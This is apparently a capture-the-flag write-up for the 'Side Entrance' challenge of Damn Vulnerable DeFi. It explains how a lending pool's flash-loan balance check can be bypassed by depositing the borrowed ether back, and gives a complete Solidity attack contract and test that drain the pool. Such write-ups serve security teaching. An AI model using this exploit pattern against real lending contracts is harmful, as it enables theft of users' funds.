You can see the challenge [here](https://www.damnvulnerabledefi.xyz/challenges/side-entrance/).

This challenge is pretty straightforward, we have three functions:

1. `deposit()` : Deposits the `msg.value` in the contract and updates the `balances` mapping, adding that value to the `msg.sender`.
2. `withdraw()` : Withdraws the amount stored in `balances` mapping of that `msg.sender` , and also updates the `balances` to zero.
3. `flashLoan()` : Makes a flash loan with `amount` specified as a parameter to the `msg.sender` , calling its `execute()` function. To prevent stealing funds, this function stores the balance before calling `execute()` and compares it with the balance after the call.

What we can do is to make a flash loan, deposits those funds, this way the balance before and after would be the same, and those funds will be stored with our address, meaning we can withdraw them easily after the flash loan.

```solidity
contract Attack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address payable recov;

    constructor(SideEntranceLenderPool _pool, address _recov) {
        pool = _pool;
        recov = payable(_recov);
    }

    function trigger() external {
        pool.flashLoan(address(pool).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external payable {
        pool.withdraw();
    }

    receive() external payable {
        recov.transfer(msg.value);
    }
}

function test_sideEntrance() public checkSolvedByPlayer {
        Attack attack = new Attack(pool, recovery);

        attack.trigger();

        attack.withdraw();
 }
```